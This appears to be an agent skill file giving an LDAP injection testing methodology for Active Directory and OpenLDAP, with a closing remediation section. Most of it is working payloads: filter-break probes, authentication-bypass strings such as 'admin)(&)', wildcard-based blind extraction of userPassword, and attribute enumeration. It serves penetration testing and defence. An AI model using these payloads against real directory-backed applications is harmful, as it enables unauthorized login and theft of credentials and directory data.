---
name: offensive-ldap-injection
description: "LDAP injection testing covering filter injection, authentication bypass, blind boolean extraction, and attribute enumeration against directory services (Active Directory, OpenLDAP). Use when an app builds LDAP search filters or bind DNs from user input — login forms, user search, address books."
---

# LDAP Injection — Offensive Testing Methodology

## Quick Workflow

1. Find inputs that flow into LDAP search filters or bind DNs (login, search)
2. Inject filter metacharacters to break or widen the filter
3. Confirm via authentication bypass or result-count changes
4. Enumerate attributes/users with blind boolean techniques

---

## Background

LDAP filters use prefix notation, e.g. `(&(uid=USER)(userPassword=PASS))`.
Injection abuses the special characters: `( ) & | ! * = \ NUL`.

---

## Detection

### Filter-Break Probes

```
*
*)(uid=*
*))%00
)(cn=*
admin)(&)
```

A probe of `*` in a search field that returns all entries confirms injection.

### Authentication Bypass

Target the bind/search filter `(&(uid=USER)(userPassword=PASS))`:

```
USER = *)(uid=*))(|(uid=*
USER = admin)(&)        # always-true AND with empty filter
USER = admin)(|(password=*
PASS = *
```

`admin)(&)` short-circuits to a tautology in many implementations.

---

## Exploitation

### Blind Boolean Extraction

Use wildcard narrowing on a known attribute to infer values:

```
(&(uid=admin)(userPassword=a*))   // true/false oracle
(&(uid=admin)(userPassword=ab*))
```

Differences in "login failed" vs "account locked" / result counts form the oracle.

### Attribute / OU Enumeration

```
*)(objectClass=*
*)(mail=*
*)(memberOf=*
```

Inject `*` against indexed attributes to dump directory structure where results echo.

---

## AD-Specific Notes

- `userAccountControl`, `memberOf`, `servicePrincipalName` are high-value attributes
- Anonymous/READ binds may expose the whole tree — test unauthenticated search
- Combine with Kerberos/ACL abuse once accounts are enumerated

---

## Remediation

- Escape LDAP special characters per RFC 4515 (`\28 \29 \5c \2a \00`)
- Use allow-lists for usernames; reject `* ( ) \ |`
- Bind with least-privilege service accounts; disable anonymous bind
- Prefer parameterized LDAP libraries over string concatenation
